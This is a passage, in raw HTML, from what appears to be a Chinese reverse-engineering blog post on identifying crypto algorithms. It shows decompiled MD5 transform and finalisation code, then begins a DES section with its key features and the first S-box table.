class="token punctuation">(</span>v73 <span class="token operator">^</span> v72 <span class="token operator">^</span> v70<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">640364487</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v68 <span class="token operator">+</span> v126 <span class="token operator">+</span> <span class="token punctuation">(</span>v73 <span class="token operator">^</span> v72 <span class="token operator">^</span> v70<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">640364487</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v75 <span class="token operator">=</span> v70 <span class="token operator">+</span> v129 <span class="token operator">+</span> <span class="token punctuation">(</span>v74 <span class="token operator">^</span> v73 <span class="token operator">^</span> v72<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">421815835</span><span class="token punctuation">;</span>  v76 <span class="token operator">=</span> v74 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v75 <span class="token operator">&lt;&lt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v75 <span class="token operator">>></span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v77 <span class="token operator">=</span> v72 <span class="token operator">+</span> v132 <span class="token operator">+</span> <span class="token punctuation">(</span>v74 <span class="token operator">^</span> v73 <span class="token operator">^</span> v76<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">530742520</span><span class="token punctuation">;</span>  v78 <span class="token operator">=</span> v76 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v77 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">HIWORD</span><span class="token punctuation">(</span>v77<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v79 <span class="token operator">=</span> v73 <span class="token operator">+</span> v119 <span class="token operator">+</span> <span class="token punctuation">(</span>v74 <span class="token operator">^</span> v78 <span class="token operator">^</span> v76<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">995338651</span><span class="token punctuation">;</span>  v80 <span class="token operator">=</span> v78 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v79 <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v79 <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v81 <span class="token operator">=</span> v74 <span class="token operator">+</span> v117 <span class="token operator">+</span> <span class="token punctuation">(</span>v78 <span class="token operator">^</span> <span class="token punctuation">(</span>v80 <span class="token operator">|</span> <span class="token operator">~</span>v76<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">198630844</span><span class="token punctuation">;</span>  v82 <span class="token operator">=</span> v80 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v81 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v81 <span class="token operator">>></span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v83 <span class="token operator">=</span> v76 <span class="token operator">+</span> v124 <span class="token operator">+</span> <span class="token punctuation">(</span>v80 <span class="token operator">^</span> <span class="token punctuation">(</span>v82 <span class="token operator">|</span> <span class="token operator">~</span>v78<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1126891415</span><span class="token punctuation">;</span>  v84 <span class="token operator">=</span> v82 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v83 <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v83 <span class="token operator">>></span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v85 <span class="token operator">=</span> v78 <span class="token operator">+</span> v131 <span class="token operator">+</span> <span class="token punctuation">(</span>v82 <span class="token operator">^</span> <span class="token punctuation">(</span>v84 <span class="token operator">|</span> <span class="token operator">~</span>v80<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1416354905</span><span class="token punctuation">;</span>  v86 <span class="token operator">=</span> v84 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v85 <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v85 <span class="token operator">>></span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v87 <span class="token operator">=</span> v80 <span class="token operator">+</span> v122 <span class="token operator">+</span> <span class="token punctuation">(</span>v84 <span class="token operator">^</span> <span class="token punctuation">(</span>v86 <span class="token operator">|</span> <span class="token operator">~</span>v82<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">57434055</span><span class="token punctuation">;</span>  v88 <span class="token operator">=</span> v86 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v87 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v87 <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v89 <span class="token operator">=</span> v82 <span class="token operator">+</span> v129 <span class="token operator">+</span> <span class="token punctuation">(</span>v86 <span class="token operator">^</span> <span class="token punctuation">(</span>v88 <span class="token operator">|</span> <span class="token operator">~</span>v84<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1700485571</span><span class="token punctuation">;</span>  v90 <span class="token operator">=</span> v88 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v89 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v89 <span class="token operator">>></span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v91 <span class="token operator">=</span> v84 <span class="token operator">+</span> v120 <span class="token operator">+</span> <span class="token punctuation">(</span>v88 <span class="token operator">^</span> <span class="token punctuation">(</span>v90 <span class="token operator">|</span> <span class="token operator">~</span>v86<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1894986606</span><span class="token punctuation">;</span>  v92 <span class="token operator">=</span> v90 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v91 <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v91 <span class="token operator">>></span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v93 <span class="token operator">=</span> v86 <span class="token operator">+</span> v127 <span class="token operator">+</span> <span class="token punctuation">(</span>v90 <span class="token operator">^</span> <span class="token punctuation">(</span>v92 <span class="token operator">|</span> <span class="token operator">~</span>v88<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1051523</span><span class="token punctuation">;</span>  v94 <span class="token operator">=</span> v92 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v93 <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v93 <span class="token operator">>></span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v95 <span class="token operator">=</span> v88 <span class="token operator">+</span> v118 <span class="token operator">+</span> <span class="token punctuation">(</span>v92 <span class="token operator">^</span> <span class="token punctuation">(</span>v94 <span class="token operator">|</span> <span class="token operator">~</span>v90<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2054922799</span><span class="token punctuation">;</span>  v96 <span class="token operator">=</span> v94 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v95 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v95 <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v97 <span class="token operator">=</span> v90 <span class="token operator">+</span> v125 <span class="token operator">+</span> <span class="token punctuation">(</span>v94 <span class="token operator">^</span> <span class="token punctuation">(</span>v96 <span class="token operator">|</span> <span class="token operator">~</span>v92<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1873313359</span><span class="token punctuation">;</span>  v98 <span class="token operator">=</span> v96 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v97 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v97 <span class="token operator">>></span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v99 <span class="token operator">=</span> v92 <span class="token operator">+</span> v132 <span class="token operator">+</span> <span class="token punctuation">(</span>v96 <span class="token operator">^</span> <span class="token punctuation">(</span>v98 <span class="token operator">|</span> <span class="token operator">~</span>v94<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">30611744</span><span class="token punctuation">;</span>  v100 <span class="token operator">=</span> v98 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v99 <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v99 <span class="token operator">>></span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v101 <span class="token operator">=</span> v94 <span class="token operator">+</span> v123 <span class="token operator">+</span> <span class="token punctuation">(</span>v98 <span class="token operator">^</span> <span class="token punctuation">(</span>v100 <span class="token operator">|</span> <span class="token operator">~</span>v96<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1560198380</span><span class="token punctuation">;</span>  v102 <span class="token operator">=</span> v100 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v101 <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v101 <span class="token operator">>></span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v103 <span class="token operator">=</span> v96 <span class="token operator">+</span> v130 <span class="token operator">+</span> <span class="token punctuation">(</span>v100 <span class="token operator">^</span> <span class="token punctuation">(</span>v102 <span class="token operator">|</span> <span class="token operator">~</span>v98<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1309151649</span><span class="token punctuation">;</span>  v104 <span class="token operator">=</span> v102 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v103 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v103 <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v105 <span class="token operator">=</span> v98 <span class="token operator">+</span> v121 <span class="token operator">+</span> <span class="token punctuation">(</span>v102 <span class="token operator">^</span> <span class="token punctuation">(</span>v104 <span class="token operator">|</span> <span class="token operator">~</span>v100<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">145523070</span><span class="token punctuation">;</span>  v106 <span class="token operator">=</span> v104 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v105 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v105 <span class="token operator">>></span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v107 <span class="token operator">=</span> v100 <span class="token operator">+</span> v128 <span class="token operator">+</span> <span class="token punctuation">(</span>v104 <span class="token operator">^</span> <span class="token punctuation">(</span>v106 <span class="token operator">|</span> <span class="token operator">~</span>v102<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1120210379</span><span class="token punctuation">;</span>  v108 <span class="token operator">=</span> v106 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v107 <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v107 <span class="token operator">>></span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v109 <span class="token operator">=</span> v102 <span class="token operator">+</span> v119 <span class="token operator">+</span> <span class="token punctuation">(</span>v106 <span class="token operator">^</span> <span class="token punctuation">(</span>v108 <span class="token operator">|</span> <span class="token operator">~</span>v104<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">718787259</span><span class="token punctuation">;</span>  v110 <span class="token operator">=</span> v108 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v109 <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v109 <span class="token operator">>></span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v111 <span class="token operator">=</span> v110 <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v112 <span class="token operator">=</span> v104 <span class="token operator">+</span> v126 <span class="token operator">+</span> <span class="token punctuation">(</span>v108 <span class="token operator">^</span> <span class="token punctuation">(</span>v110 <span class="token operator">|</span> <span class="token operator">~</span>v106<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">343485551</span><span class="token punctuation">;</span>  v113 <span class="token operator">=</span> v106 <span class="token operator">+</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>  v114 <span class="token operator">=</span> v110 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v112 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v112 <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v115 <span class="token operator">=</span> v108 <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> v114<span class="token punctuation">;</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> v113<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v111<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v115<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sub_401E10</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v117<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// MD5_Final</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_401390</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-8h] BYREF</span>  <span class="token function">sub_401D50</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> a2 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">56</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">>=</span> <span class="token number">0x38</span> <span class="token punctuation">)</span>    v3 <span class="token operator">=</span> <span class="token number">120</span><span class="token punctuation">;</span>  <span class="token function">sub_4012E0</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_407030<span class="token punctuation">,</span> v3 <span class="token operator">-</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4012E0</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_401D50</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sub_401E10</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_4012E0</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ebp</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> a3<span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token operator">*</span> a3 <span class="token punctuation">)</span>    <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+=</span> a3 <span class="token operator">>></span> <span class="token number">29</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">64</span> <span class="token operator">-</span> v4<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token operator">&lt;</span> <span class="token number">64</span> <span class="token operator">-</span> v4 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_401DF0</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> <span class="token number">64</span> <span class="token operator">-</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_401400</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> v5<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">63</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a3<span class="token punctuation">;</span> v6 <span class="token operator">+=</span> <span class="token number">64</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_401400</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2 <span class="token operator">+</span> i <span class="token operator">-</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      i <span class="token operator">+=</span> <span class="token number">64</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">sub_401DF0</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">,</span> a2 <span class="token operator">+</span> v6<span class="token punctuation">,</span> a3 <span class="token operator">-</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><blockquote><p>DES 加密，即即数据加密标准（Data Encryption Standard），属于对称加密算法，是一种使用密钥加密的分组算法</p><p>参考文献：</p><ol><li><a href="https://bbs.kanxue.com/thread-265939.htm#msg_header_h1_6">[原创]逆向中常见的Hash算法和对称加密算法的分析-密码应用-看雪-安全社区|安全招聘|kanxue.com</a>  </li><li><a href="https://bbs.kanxue.com/thread-269299.htm#msg_header_h1_2">[分享]DES加密-密码应用-看雪-安全社区|安全招聘|kanxue.com</a></li></ol></blockquote><h2 id="特点-6"><a href="#特点-6" class="headerlink" title="特点"></a>特点</h2><ol><li><p>Key 为 8 字节共 64 位（实际使用 56 位），明文或密文也为 8 字节 64 位</p></li><li><p>DES 算法一般有两个关键点：加密算法和数据补位</p></li><li><p>存在 8 个置换盒 <code>S1 ~ S8</code></p></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> S1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>             <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>             <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token 